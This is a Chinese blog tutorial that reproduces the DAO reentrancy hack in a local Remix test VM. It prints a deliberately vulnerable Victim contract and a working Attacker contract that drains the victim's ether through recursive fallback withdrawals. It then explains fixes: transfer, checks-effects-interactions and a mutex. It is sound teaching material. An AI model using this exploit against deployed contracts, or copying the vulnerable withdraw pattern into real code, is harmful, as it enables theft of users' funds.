<!DOCTYPE html><html lang=zh-CN data-default-color-scheme=auto><head><meta charset=UTF-8><link rel=apple-touch-icon sizes=76x76 href=/img/favicon/favicon.png><link rel=icon href=/img/favicon/favicon.png><link rel=canonical href="https://justloseit.top/Re-Entrancy 攻击模拟——The DAO 事件复现与分析/"><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=5,shrink-to-fit=no"><meta http-equiv=x-ua-compatible content="ie=edge"><meta name=theme-color content=#2f4154><meta name=author content="Mobilis In Mobili"><meta name=keywords content=""><meta name=description content="对区块链经典安全事件——The DAO 事件的 Re-Entrancy 攻击模拟"><meta property=og:type content=article><meta property=og:title content="Re-Entrancy 攻击模拟——The DAO 事件复现与分析"><meta property=og:url content=https://justloseit.top/Re-Entrancy%20%E6%94%BB%E5%87%BB%E6%A8%A1%E6%8B%9F%E2%80%94%E2%80%94The%20DAO%20%E4%BA%8B%E4%BB%B6%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/index.html><meta property=og:site_name content=动中之动><meta property=og:description content="对区块链经典安全事件——The DAO 事件的 Re-Entrancy 攻击模拟"><meta property=og:locale content=zh_CN><meta property=og:image content=https://justloseit.top/img/index/Re-Entrancy%20%E6%94%BB%E5%87%BB%E6%A8%A1%E6%8B%9F%E2%80%94%E2%80%94The%20DAO%20%E4%BA%8B%E4%BB%B6%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90.jpg><meta property=article:published_time content=2020-12-31T07:46:25.000Z><meta property=article:modified_time content=2023-03-03T07:11:45.374Z><meta property=article:author content="Mobilis In Mobili"><meta property=article:tag content=区块链><meta name=twitter:card content=summary_large_image><meta name=twitter:image content=https://justloseit.top/img/index/Re-Entrancy%20%E6%94%BB%E5%87%BB%E6%A8%A1%E6%8B%9F%E2%80%94%E2%80%94The%20DAO%20%E4%BA%8B%E4%BB%B6%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90.jpg><title>Re-Entrancy 攻击模拟——The DAO 事件复现与分析 - 动中之动</title><link rel=stylesheet href=https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css><link rel=stylesheet href=https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css><link rel=stylesheet href=https://lib.baomitu.com/hint.css/2.7.0/hint.min.css><link rel=stylesheet href=https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css><link rel=stylesheet href=https://lib.baomitu.com/KaTeX/0.16.2/katex.min.css><link rel=stylesheet href=//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css><link rel=stylesheet href=//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css><link rel=stylesheet href=/css/main.css><link id=highlight-css rel=stylesheet href=/css/highlight.css><link id=highlight-css-dark rel=stylesheet href=/css/highlight-dark.css><script id=fluid-configs>var dntVal,Fluid=window.Fluid||{},CONFIG=(Fluid.ctx=Object.assign({},Fluid.ctx),{hostname:"justloseit.top",root:"/",version:"1.9.8",typing:{enable:!0,typeSpeed:60,cursorChar:"_",loop:!1,scope:[]},anchorjs:{enable:!0,element:"h1,h2,h3,h4,h5,h6",placement:"right",visible:"hover",icon:"§"},progressbar:{enable:!0,height_px:3,color:"#29d",options:{showSpinner:!1,trickleSpeed:100}},code_language:{enable:!0,default:"TEXT"},copy_btn:!0,image_caption:{enable:!0},image_zoom:{enable:!0,img_url_replace:["",""]},toc:{enable:!0,placement:"right",headingSelector:"h1,h2,h3,h4,h5,h6",collapseDepth:0},lazyload:{enable:!0,loading_img:"/img/loading.gif",onlypost:!1,offset_factor:2},web_analytics:{enable:!0,follow_dnt:!1,baidu:null,google:{measurement_id:null},tencent:{sid:null,cid:null},leancloud:{app_id:"snI2XNrHrhyx5g84m3Uim3EC-gzGzoHsz",app_key:"x2YseXJIHmvnsM4v9y9UAlvu",server_url:"https://sni2xnrh.lc-cn-n1-shared.com",path:"window.location.pathname",ignore_local:!1},umami:{src:null,website_id:null,domains:null,start_time:"2024-01-01T00:00:00.000Z",token:null,api_server:null}},search_path:"/local-search.xml",include_content_in_search:!0});CONFIG.web_analytics.follow_dnt&&(dntVal=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack,Fluid.ctx.dnt=dntVal&&(dntVal.startsWith("1")||dntVal.startsWith("yes")||dntVal.startsWith("on")))</script><script src=/js/utils.js></script><script src=/js/color-schema.js></script><meta name=generator content="Hexo 5.4.2"><link rel=alternate href=/atom.xml title=动中之动 type=application/atom+xml></head><body><header><div class=header-inner style=height:70vh><nav id=navbar class="navbar fixed-top navbar-expand-lg navbar-dark scrolling-navbar"><div class=container><a class=navbar-brand href=/ ><strong>Mobilis In Mobili</strong> </a><button id=navbar-toggler-btn class=navbar-toggler type=button data-toggle=collapse data-target=#navbarSupportedContent aria-controls=navbarSupportedContent aria-expanded=false aria-label="Toggle navigation"><div class=animated-icon><span></span><span></span><span></span></div></button><div class="collapse navbar-collapse" id=navbarSupportedContent><ul class="navbar-nav ml-auto text-center"><li class=nav-item><a class=nav-link href=/ target=_self><i class="iconfont icon-home-fill"></i> <span>首页</span></a></li><li class=nav-item><a class=nav-link href=/archives/ target=_self><i class="iconfont icon-archive-fill"></i> <span>归档</span></a></li><li class=nav-item><a class=nav-link href=/categories/ target=_self><i class="iconfont icon-category-fill"></i> <span>分类</span></a></li><li class=nav-item><a class=nav-link href=/tags/ target=_self><i class="iconfont icon-tags-fill"></i> <span>标签</span></a></li><li class=nav-item><a class=nav-link href=/about/ target=_self><i class="iconfont icon-user-fill"></i> <span>关于</span></a></li><li class=nav-item><a class=nav-link href=/links/ target=_self><i class="iconfont icon-link-fill"></i> <span>友链</span></a></li><li class=nav-item id=search-btn><a class=nav-link target=_self href=javascript:; data-toggle=modal data-target=#modalSearch aria-label=Search><i class="iconfont icon-search"></i></a></li><li class=nav-item id=color-toggle-btn><a class=nav-link target=_self href=javascript:; aria-label="Color Toggle"><i class="iconfont icon-dark" id=color-toggle-icon></i></a></li></ul></div></div></nav><div id=banner class=banner parallax=true style="background:url(/img/banner/Re-Entrancy%20%E6%94%BB%E5%87%BB%E6%A8%A1%E6%8B%9F%E2%80%94%E2%80%94The%20DAO%20%E4%BA%8B%E4%BB%B6%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90.jpg) no-repeat center center;background-size:cover"><div class=full-bg-img><div class="mask flex-center" style=background-color:rgba(0,0,0,.3)><div class="banner-text text-center fade-in-up"><div class=h2><span id=subtitle data-typed-text="Re-Entrancy 攻击模拟——The DAO 事件复现与分析"></span></div><div class=mt-3><span class="post-meta mr-2"><i class="iconfont icon-author" aria-hidden=true></i> Mobilis In Mobili </span><span class=post-meta><i class="iconfont icon-date-fill" aria-hidden=true></i> <time datetime="2020-12-31 15:46" pubdate>2020年12月31日 下午</time></span></div><div class=mt-1><span class="post-meta mr-2"><i class="iconfont icon-chart"></i> 1.8k 字 </span><span class="post-meta mr-2"><i class="iconfont icon-clock-fill"></i> 15 分钟 </span><span id=leancloud-page-views-container class=post-meta style=display:none><i class="iconfont icon-eye" aria-hidden=true></i> <span id=leancloud-page-views></span> 次</span></div></div></div></div></div></div></header><main><div class="container-fluid nopadding-x"><div class="row nomargin-x"><div class="side-col d-none d-lg-block col-lg-2"></div><div class="col-lg-8 nopadding-x-md"><div class="container nopadding-x-md" id=board-ctn><div id=board><article class="post-content mx-auto"><h1 id=seo-header>Re-Entrancy 攻击模拟——The DAO 事件复现与分析</h1><p id=updated-time class="note note-info">本文最后更新于 2023年3月3日 下午</p><div class=markdown-body><p>对区块链经典安全事件——The DAO 事件的 Re-Entrancy 攻击模拟</p><span id=more></span><h1 id=re-entrancy-攻击模拟the-dao-事件复现与分析><a class=markdownIt-Anchor href=#re-entrancy-攻击模拟the-dao-事件复现与分析></a> Re-Entrancy 攻击模拟——The DAO 事件复现与分析</h1><h2 id=实验概述><a class=markdownIt-Anchor href=#实验概述></a> 实验概述</h2><h3 id=攻击背景><a class=markdownIt-Anchor href=#攻击背景></a> 攻击背景</h3><ul><li>The DAO 成立于 2016 年 5 月，是一个基于以太坊网络、以众筹为目的的去中心化自治组织。The DAO 众筹最大的特征是速度快，交易规模和速度远远快于一般的互联网众筹，在成立之初的短短 1 个月之内就筹集了超过 1.5 亿个以太币。因此，The DAO 是当时最大的众筹项目。</li><li>然而，The DAO 的智能合约代码存在递归调用漏洞的问题，因此，黑客可以借此发动 Re-Entrancy 攻击。黑客不停地从The DAO 资金池里分离资产并在调用结束前，把盗来的The DAO资产转移到了其他账户，避免了被销毁。黑客利用这两个漏洞，进行了两百多次攻击，总共盗走了 360 万的以太币，超过了该项目筹集的以太币总数目的三分之一。</li><li>由于参与 The DAO 的 ETH 总额占 ETH 总流通量的 30% 以上，ETH 社区不得不采取比中心化机构还更加“中心化”的方式对用户金额进行补救，也就是将 ETH 硬分叉为新的 ETH 和 ETC。这一事件史称为 The DAO 事件。</li></ul><h3 id=攻击原理><a class=markdownIt-Anchor href=#攻击原理></a> 攻击原理</h3><ul><li><p><code>Gas</code>：一经创建，每笔交易都收取一定数量的 <code>gas</code> ，目的是限制执行交易所需要的工作量和为交易支付手续费。<code>EVM</code> 执行交易时，<code>gas</code> 将按特定规则逐渐耗尽。</p><p><code>gas price</code> 是交易发送者设置的一个值，发送者账户需要预付的手续费。如果交易执行后还有剩余， <code>gas</code> 会原路返还。</p><p>无论执行到什么位置，一旦 <code>gas</code> 被耗尽，将会触发一个 <code>out-of-gas</code> 异常。当前调用帧所做的所有状态修改都将被回滚。</p></li><li><p>转 ETH 操作</p><ul><li><p><code>call</code></p><ul><li>原型：<code>&lt;address&gt;.call(...) returns (bool)</code></li><li>以 <strong><code>address</code>（被调用合约）的身份</strong> 调用 <code>address</code> 内的函数，默认情况下<strong>将所有可用的 <code>gas</code> 传输</strong>过去，<code>gas</code> 传输量可调。执行失败时返回false</li></ul></li><li><p><code>send</code></p><ul><li><p>原型：<code>&lt;address&gt;.send(uint256 amount) returns (bool)</code></p></li><li><p><strong>向 <code>address</code><strong>发送 <code>amount</code> 数量的 <strong><code>Wei</code></strong>，<strong>如果执行失败返回 <code>false</code></strong>。发送的同时</strong>传输 <code>2300gas</code></strong>，<code>gas</code> 数量不可调整</p></li></ul></li><li><p><code>transfer</code></p><ul><li>原型：<code>&lt;address&gt;.transfer(uint256 amount)</code></li><li><strong>向 <code>address</code><strong>发送 <code>amount</code> 数量的 <strong><code>Wei</code></strong>，<strong>如果执行失败则 <code>throw</code></strong>。发送的同时</strong>传输 <code>2300gas</code></strong>，<code>gas</code> 数量不可调整</li></ul></li></ul></li><li><p><code>fallback function</code> 回退函数：每一个合约有且仅有一个没有名字的函数。这个函数无参数，也无返回值。如果调用合约时，没有匹配上任何一个函数(或者没有传哪怕一点数据)，就会调用默认的回退函数。<strong>此外，当合约收到 <code>ether</code> 时（没有任何其它数据），这个函数也会被执行。</strong></p></li><li><p>以太坊智能合约能够调用和利用其他外部合约的代码。合约通常也处理以太币，因此将以太币发送到各种外部用户地址。调用外部合约或将以太币发送到地址的操作要求合约提交外部调用。这些外部调用可以被攻击者劫持，从而迫使合约执行更多的代码（即通过 <code>fallback function</code> 回退函数），包括回调原合约本身。</p></li></ul><h3 id=攻击流程><a class=markdownIt-Anchor href=#攻击流程></a> 攻击流程</h3><ul><li>对于一个能够正常存钱和取钱的合约 <code>Victim</code>，利用其地址构建相应攻击合约 <code>Attacker</code></li><li><code>Attacker</code> 合约调用其攻击函数 <code>Attack</code>，该函数需要附上一定的 <code>ether</code> 作为存入资金存入到 <code>Vitcim</code> 中</li><li><code>Attack</code> 函数申请取出存入的 <code>ether</code>，<code>Vitcim</code> 向 <code>Attack</code> 函数发送相应的 <code>ether</code>，但是<strong>此时仍然在 <code>Attack</code> 函数中，<code>Victim</code> 还没有改变存款记录</strong></li><li>由于 <code>Attacker</code> 收到了 <code>ether</code>，所以会调用 <code>fallback function</code>，继续申请取出存入的 <code>ether</code>，<code>Vitcim</code> 向 <code>Attack</code> 函数发送相应的 <code>ether</code>，<strong>同样<code>Victim</code> 还没有改变存款记录</strong></li><li>而上述步骤会一直进行下去，直到达到 <code>Attacker</code> 提前设置好的攻击次数</li><li>攻击者提出储存在 <code>Attacker</code> 中的 <code>ether</code> 即可完成攻击</li></ul><h3 id=攻击效果><a class=markdownIt-Anchor href=#攻击效果></a> 攻击效果</h3><ul><li>在正常情况下，用户最多只能够取出自己在 <code>Victim</code> 上记录的 <code>ether</code> 数目；如果发送的取出数目大于记录数目，那么无法取出任何 <code>ether</code></li><li>而攻击者利用 <code>Attacker</code>，可以不断地取出 <code>ether</code>，直到整个 <code>Vitcim</code> 合约上的 <code>ether</code> 数目为 0</li></ul><h2 id=实验内容><a class=markdownIt-Anchor href=#实验内容></a> 实验内容</h2><h3 id=实验条件><a class=markdownIt-Anchor href=#实验条件></a> 实验条件</h3><ul><li>本实验基于 Remix Ethereum IDE，采用的编译版本是 0.4.26+commit.4563c3fc，测试环境是 Javascript VM</li></ul><h3 id=实验设置><a class=markdownIt-Anchor href=#实验设置></a> 实验设置</h3><ul><li>Vitcim 合约如下</li></ul><figure class="highlight javascript"><table><tr><td class=gutter><pre><span class=line>1</span><br><span class=line>2</span><br><span class=line>3</span><br><span class=line>4</span><br><span class=line>5</span><br><span class=line>6</span><br><span class=line>7</span><br><span class=line>8</span><br><span class=line>9</span><br><span class=line>10</span><br><span class=line>11</span><br><span class=line>12</span><br><span class=line>13</span><br><span class=line>14</span><br><span class=line>15</span><br><span class=line>16</span><br><span class=line>17</span><br><span class=line>18</span><br><span class=line>19</span><br><span class=line>20</span><br><span class=line>21</span><br><span class=line>22</span><br><span class=line>23</span><br><span class=line>24</span><br><span class=line>25</span><br></pre></td><td class=code><pre><code class="hljs javascript">contract <span class="hljs-title class_">Victim</span>&#123;<br>    <span class=hljs-comment>//账本</span><br>    <span class="hljs-title function_">mapping</span>(<span class=hljs-function><span class=hljs-params>address</span>=&gt;</span>uint256)public balances;<br>    <span class=hljs-comment>//查看账本</span><br>    <span class=hljs-keyword>function</span> <span class="hljs-title function_">balanceOf</span>(<span class=hljs-params>address addr</span>)public view <span class="hljs-title function_">returns</span> (uint balance)&#123;<br>        <span class=hljs-keyword>return</span> balances[addr];<br>    &#125;<br><br>    <span class=hljs-comment>//收钱记账</span><br>    <span class=hljs-keyword>function</span> <span class="hljs-title function_">donate</span>(<span class=hljs-params>address to</span>)public payable&#123;<br>        balances[to]+=msg.<span class=hljs-property>value</span>;<br>    &#125;<br>    <span class=hljs-comment>//提款 </span><br>    <span class=hljs-keyword>function</span> <span class="hljs-title function_">withdraw</span>(<span class=hljs-params>uint amount</span>)public&#123;<br>        <span class=hljs-keyword>if</span>(balances[msg.<span class=hljs-property>sender</span>]&gt;=amount)&#123;<br>            <span class=hljs-comment>//关键</span><br>            msg.<span class=hljs-property>sender</span>.<span class=hljs-property>call</span>.<span class="hljs-title function_">value</span>(amount)();<br>            balances[msg.<span class=hljs-property>sender</span>]-=amount;<br>        &#125;<br>    &#125;<br>    <span class=hljs-comment>//总账</span><br>    <span class=hljs-keyword>function</span> <span class="hljs-title function_">thisBalance</span>(<span class=hljs-params></span>)public view <span class="hljs-title function_">returns</span>(<span class=hljs-params>uint balance</span>)&#123;<br>        <span class=hljs-keyword>return</span> <span class="hljs-variable language_">this</span>.<span class=hljs-property>balance</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>A 账号部署 Vitctim 合约</li></ul><div align=center><img src="/img/post/Re-Entrancy 攻击模拟——The DAO 事件复现与分析/A 账号部署 Vitctim 合约.png" srcset="/img/loading.gif" lazyload style=zoom:50%></div><ul><li>A 账号存入 Victim 合约 50 ether</li></ul><div align=center><img src="/img/post/Re-Entrancy 攻击模拟——The DAO 事件复现与分析/A 账号存入 Victim 合约 50 ether.png" srcset="/img/loading.gif" lazyload style=zoom:50%></div><ul><li>A 账号提取 51 ether 失败</li></ul><div align=center><img src="/img/post/Re-Entrancy 攻击模拟——The DAO 事件复现与分析/A 账号提取 51 ether 失败.png" srcset="/img/loading.gif" lazyload style=zoom:50%></div><ul><li>A 账号提取 1 ether 成功</li></ul><div align=center><img src="/img/post/Re-Entrancy 攻击模拟——The DAO 事件复现与分析/A 账号提取 1 ether 成功.png" srcset="/img/loading.gif" lazyload style=zoom:50%></div><ul><li>这是正常工作状态下的 Victim 合约，可以看到，此时合约能够进行正常的存取和记账</li></ul><h3 id=实验过程><a class=markdownIt-Anchor href=#实验过程></a> 实验过程</h3><ul><li>攻击 payload 如下</li></ul><figure class="highlight javascript"><table><tr><td class=gutter><pre><span class=line>1</span><br><span class=line>2</span><br><span class=line>3</span><br><span class=line>4</span><br><span class=line>5</span><br><span class=line>6</span><br><span class=line>7</span><br><span class=line>8</span><br><span class=line>9</span><br><span class=line>10</span><br><span class=line>11</span><br><span class=line>12</span><br><span class=line>13</span><br><span class=line>14</span><br><span class=line>15</span><br><span class=line>16</span><br><span class=line>17</span><br><span class=line>18</span><br><span class=line>19</span><br><span class=line>20</span><br><span class=line>21</span><br><span class=line>22</span><br><span class=line>23</span><br><span class=line>24</span><br><span class=line>25</span><br><span class=line>26</span><br><span class=line>27</span><br><span class=line>28</span><br><span class=line>29</span><br><span class=line>30</span><br><span class=line>31</span><br><span class=line>32</span><br><span class=line>33</span><br><span class=line>34</span><br><span class=line>35</span><br><span class=line>36</span><br><span class=line>37</span><br><span class=line>38</span><br><span class=line>39</span><br><span class=line>40</span><br><span class=line>41</span><br><span class=line>42</span><br><span class=line>43</span><br><span class=line>44</span><br><span class=line>45</span><br><span class=line>46</span><br><span class=line>47</span><br></pre></td><td class=code><pre><code class="hljs javascript">contract <span class="hljs-title class_">Attacker</span>&#123;<br>    <br>    <span class=hljs-comment>//受害地址  </span><br>    address vAddr;<br>    <br>    <span class=hljs-comment>//受害者</span><br>    <span class="hljs-title class_">Victim</span> v;<br>    <br>    <span class=hljs-comment>//拥有者地址拥有钱拥有者这</span><br>    address owner;<br>    <br>    <span class=hljs-comment>//攻击次数</span><br>    uint attackCount;<br>    <br>    <br>    <span class="hljs-title function_">constructor</span>(<span class=hljs-params>address addr</span>) public &#123;<br>        vAddr=addr;<br>        owner = msg.<span class=hljs-property>sender</span>;<br>    &#125;<br>    <br>    <span class=hljs-keyword>function</span> <span class="hljs-title function_">attack</span>(<span class=hljs-params></span>)public payable&#123;<br>        attackCount=<span class=hljs-number>0</span>;<br>        v=<span class="hljs-title class_">Victim</span>(vAddr);<br>        v.<span class=hljs-property>donate</span>.<span class="hljs-title function_">value</span>(msg.<span class=hljs-property>value</span>)(<span class="hljs-variable language_">this</span>);<br>        v.<span class="hljs-title function_">withdraw</span>(<span class=hljs-number>0</span>);<br>    &#125;<br>    <br>    <span class=hljs-keyword>function</span> (<span class=hljs-params></span>) public payable&#123;<br>        <span class=hljs-keyword>if</span>(msg.<span class=hljs-property>sender</span>==vAddr&amp;&amp;attackCount&lt;<span class=hljs-number>10</span>)&#123;<br>            attackCount+=<span class=hljs-number>1</span>;<br>            uint sum=v.<span class="hljs-title function_">balanceOf</span>(<span class="hljs-variable language_">this</span>);<br>            <span class=hljs-comment>//不足则全提款  </span><br>            <span class=hljs-keyword>if</span>(sum&gt;v.<span class=hljs-property>balance</span>)&#123;<br>                <span class=hljs-keyword>if</span>(v.<span class=hljs-property>balance</span>!=<span class=hljs-number>0</span>)&#123;<br>                    v.<span class="hljs-title function_">withdraw</span>(v.<span class=hljs-property>balance</span>);<br>                &#125;<br>                <span class=hljs-keyword>return</span>;<br>            &#125;<br>            v.<span class="hljs-title function_">withdraw</span>(sum);<br>        &#125;<br>    &#125;<br>    <br>    <br>    <span class=hljs-keyword>function</span> <span class="hljs-title function_">getJackpot</span>(<span class=hljs-params></span>)public&#123;<br>        owner.<span class="hljs-title function_">transfer</span>(<span class="hljs-variable language_">this</span>.<span class=hljs-property>balance</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>B 账号根据 Victim 合约地址部署 Attacker 合约</li></ul><div align=center><img src="/img/post/Re-Entrancy 攻击模拟——The DAO 事件复现与分析/B 账号根据 Victim 合约地址部署 Attacker 合约.png" srcset="/img/loading.gif" lazyload style=zoom:50%></div><ul><li>B 账号发动攻击，附上 5 ether</li></ul><div align=center><img src="/img/post/Re-Entrancy 攻击模拟——The DAO 事件复现与分析/B 账号发动攻击，附上 5 ether.png" srcset="/img/loading.gif" lazyload style=zoom:50%></div><ul><li>B 账号提取出攻击得到的币，<strong>注意 B 账号变成了 144.9999999 ether</strong></li></ul><div align=center><img src="/img/post/Re-Entrancy 攻击模拟——The DAO 事件复现与分析/B 账号提取出攻击得到的币.png" srcset="/img/loading.gif" lazyload style=zoom:50%></div><ul><li>攻击后，B 账户取出了不属于 B 账户的钱</li></ul><h3 id=实验结论><a class=markdownIt-Anchor href=#实验结论></a> 实验结论</h3><ul><li>对比攻击前后，账户从仅能取出账面记录的钱变成了可以无限制取出合约的钱，说明攻击成功</li></ul><h2 id=实验分析><a class=markdownIt-Anchor href=#实验分析></a> 实验分析</h2><ul><li><p>从上述实现现象中，可以看出 Re-Entrancy 攻击的可怕之处，下面逆向思考如何来修补漏洞，防止此类攻击</p></li><li><p>将 <code>ether</code> 发送到外部合约时使用内置的 <code>transfer</code>函数。<code>transfer</code>函数仅发送 <code>2300 Gas</code> 给外部调用，这不足以使目的地址合约调用另一个合约（即重入原合约）</p><figure class="highlight javascript"><table><tr><td class=gutter><pre><span class=line>1</span><br></pre></td><td class=code><pre><code class="hljs javascript">msg.<span class=hljs-property>sender</span>.<span class=hljs-property>call</span>.<span class="hljs-title function_">value</span>(amount)();<br></code></pre></td></tr></table></figure><p>变成</p><figure class="highlight javascript"><table><tr><td class=gutter><pre><span class=line>1</span><br></pre></td><td class=code><pre><code class="hljs javascript">msg.<span class=hljs-property>sender</span>.<span class="hljs-title function_">transfer</span>(amount);<br></code></pre></td></tr></table></figure></li><li><p><code>Victim</code> 账户是先转钱给 <code>Attack</code> 然后修改记录，而 Re-Entrancy 攻击使得上述步骤仅仅进行到转钱而不修改记录，因此一种可行的修改方法是，先记录，再转账</p><figure class="highlight javascript"><table><tr><td class=gutter><pre><span class=line>1</span><br><span class=line>2</span><br></pre></td><td class=code><pre><code class="hljs javascript">msg.<span class=hljs-property>sender</span>.<span class=hljs-property>call</span>.<span class="hljs-title function_">value</span>(amount)();<br>balances[msg.<span class=hljs-property>sender</span>]-=amount;<br></code></pre></td></tr></table></figure><p>修改成</p><figure class="highlight javascript"><table><tr><td class=gutter><pre><span class=line>1</span><br><span class=line>2</span><br></pre></td><td class=code><pre><code class="hljs javascript">balances[msg.<span class=hljs-property>sender</span>]-=amount;            <br>msg.<span class=hljs-property>sender</span>.<span class=hljs-property>call</span>.<span class="hljs-title function_">value</span>(amount)();<br></code></pre></td></tr></table></figure><p>但是，这里仍然存在一个新问题：如果提现失败，交易并不会回滚，此时 <code>balances[msg.sender]</code> 已清空</p><p>所以，应该采用 <em>checks-effects-interactions</em> 模式，使用 <code>require</code> 语句进行检查</p></li><li><p>引入互斥锁，保证仅仅在必须要在记账完成之后才能再次取钱</p></li></ul></div><hr><div><div class="post-metas my-3"><div class="post-meta mr-3 d-flex align-items-center"><i class="iconfont icon-category"></i> <span class=category-chains><span class=category-chain><a href=/categories/%E6%95%99%E7%A8%8B/ class=category-chain-item>教程</a></span></span></div><div class=post-meta><i class="iconfont icon-tags"></i> <a href=/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/ class=print-no-link>#区块链</a></div></div><div class="license-box my-3"><div class=license-title><div>Re-Entrancy 攻击模拟——The DAO 事件复现与分析</div><div>https://justloseit.top/Re-Entrancy 攻击模拟——The DAO 事件复现与分析/</div></div><div class=license-meta><div class=license-meta-item><div>作者</div><div>Mobilis In Mobili</div></div><div class="license-meta-item license-meta-date"><div>发布于</div><div>2020年12月31日</div></div><div class="license-meta-item license-meta-date"><div>更新于</div><div>2023年3月3日</div></div><div class=license-meta-item><div>许可协议</div><div><a class=print-no-link target=_blank href=https://creativecommons.org/licenses/by/4.0/ ><span class="hint--top hint--rounded" aria-label="BY - 署名"><i class="iconfont icon-cc-by"></i></span></a></div></div></div><div class="license-icon iconfont"></div></div><div class="post-prevnext my-3"><article class="post-prev col-6"><a href=/%E5%9F%BA%E4%BA%8E%20ESP8266%20%E7%9A%84%20Wi-Fi%20%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB%E7%9A%84%E5%AE%9E%E7%8E%B0/ title="基于 ESP8266 的 Wi-Fi 取消验证洪水攻击的实现"><i class="iconfont icon-arrowleft"></i> <span class=hidden-mobile>基于 ESP8266 的 Wi-Fi 取消验证洪水攻击的实现</span> <span class=visible-mobile>上一篇</span></a></article><article class="post-next col-6"><a href=/Bitcoin%20Core%E4%B8%8A%E5%AE%9E%E7%8E%B0%E5%A4%9A%E7%AD%BE%E4%BA%A4%E6%98%93/ title="Bitcoin Core上实现多签交易"><span class=hidden-mobile>Bitcoin Core上实现多签交易</span> <span class=visible-mobile>下一篇</span> <i class="iconfont icon-arrowright"></i></a></article></div></div><article id=comments><div id=valine></div><script type=text/javascript>Fluid.utils.loadComments("#valine",function(){Fluid.utils.createScript("https://lib.baomitu.com/valine/1.5.1/Valine.min.js",function(){var i=Object.assign({appId:"t4w421aIGl2GXkT0tSGoap5I-gzGzoHsz",appKey:"BpNeeVt0v3tKAbF1L6RTf94X",path:"window.location.pathname",placeholder:"说点什么",avatar:"hide",meta:["nick","mail","link"],requiredFields:[],pageSize:10,lang:"zh-CN",highlight:!0,recordIP:!1,serverURLs:"https://t4w421ai.lc-cn-n1-shared.com",emojiCDN:null,emojiMaps:null,enableQQ:!1},{el:"#valine",path:window.location.pathname});new Valine(i),Fluid.utils.waitElementVisible("#valine .vcontent",()=>{var i="#valine .vcontent img:not(.vemoji)";Fluid.plugins.imageCaption(i),Fluid.plugins.fancyBox(i)})})})</script><noscript>Please enable JavaScript to view the comments</noscript></article></article></div></div></div><div class="side-col d-none d-lg-block col-lg-2"><aside class=sidebar style=margin-left:-1rem><div id=toc><p class=toc-header><i class="iconfont icon-list"></i> <span>目录</span></p><div class=toc-body id=toc-body></div></div></aside></div></div></div><script>Fluid.utils.createScript("https://lib.baomitu.com/mermaid/8.14.0/mermaid.min.js",function(){mermaid.initialize({theme:"default"}),Fluid.utils.listenDOMLoaded(function(){Fluid.events.registerRefreshCallback(function(){"mermaid"in window&&mermaid.init()})})})</script><a id=scroll-top-button aria-label=TOP href=# role=button><i class="iconfont icon-arrowup" aria-hidden=true></i></a><div class="modal fade" id=modalSearch tabindex=-1 role=dialog aria-labelledby=ModalLabel aria-hidden=true><div class="modal-dialog modal-dialog-scrollable modal-lg" role=document><div class=modal-content><div class="modal-header text-center"><h4 class="modal-title w-100 font-weight-bold">搜索</h4><button type=button id=local-search-close class=close data-dismiss=modal aria-label=Close><span aria-hidden=true>&times;</span></button></div><div class="modal-body mx-3"><div class="md-form mb-5"><input type=text id=local-search-input class="form-control validate"> <label data-error=x data-success=v for=local-search-input>关键词</label></div><div class=list-group id=local-search-result></div></div></div></div></div></main><footer><div class=footer-inner><div class=footer-content><a href=https://hexo.io target=_blank rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href=https://github.com/fluid-dev/hexo-theme-fluid target=_blank rel="nofollow noopener"><span>Fluid</span></a></div><div class=statistics><span id=leancloud-site-pv-container style=display:none>总访问量 <span id=leancloud-site-pv></span> 次 </span><span id=leancloud-site-uv-container style=display:none>总访客数 <span id=leancloud-site-uv></span> 人</span></div><div class=beian><span><a href=http://beian.miit.gov.cn/ target=_blank rel="nofollow noopener"><a target=_blank rel=noopener href=https://beian.miit.gov.cn>京ICP备2021006744号-1</a> </a></span><span><a href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=11010802034644" rel="nofollow noopener" class=beian-police target=_blank><span style=visibility:hidden;width:0>|</span> <img src=/img/police_beian.png alt=police-icon> <span>京公网安备 11010802034644号</span></a></span></div></div></footer><script src=https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js></script><link rel=stylesheet href=https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css><script>NProgress.configure({showSpinner:!1,trickleSpeed:100}),NProgress.start(),window.addEventListener("load",function(){NProgress.done()})</script><script src=https://lib.baomitu.com/jquery/3.6.4/jquery.min.js></script><script src=https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js></script><script src=/js/events.js></script><script src=/js/plugins.js></script><script src=https://lib.baomitu.com/typed.js/2.0.12/typed.min.js></script><script>(t=>{var e=Fluid.plugins.typing;(t=t.getElementById("subtitle"))&&e&&e(t.getAttribute("data-typed-text"))})((window,document))</script><script src=/js/img-lazyload.js></script><script>Fluid.utils.createScript("https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js",function(){var t,o=jQuery("#toc");0!==o.length&&window.tocbot&&(t=jQuery("#board-ctn").offset().top,window.tocbot.init(Object.assign({tocSelector:"#toc-body",contentSelector:".markdown-body",linkClass:"tocbot-link",activeLinkClass:"tocbot-active-link",listClass:"tocbot-list",isCollapsedClass:"tocbot-is-collapsed",collapsibleClass:"tocbot-is-collapsible",scrollSmooth:!0,includeTitleTags:!0,headingsOffset:-t},CONFIG.toc)),0<o.find(".toc-list-item").length&&o.css("visibility","visible"),Fluid.events.registerRefreshCallback(function(){var t;"tocbot"in window&&(tocbot.refresh(),0!==(t=jQuery("#toc")).length)&&tocbot&&0<t.find(".toc-list-item").length&&t.css("visibility","visible")}))})</script><script 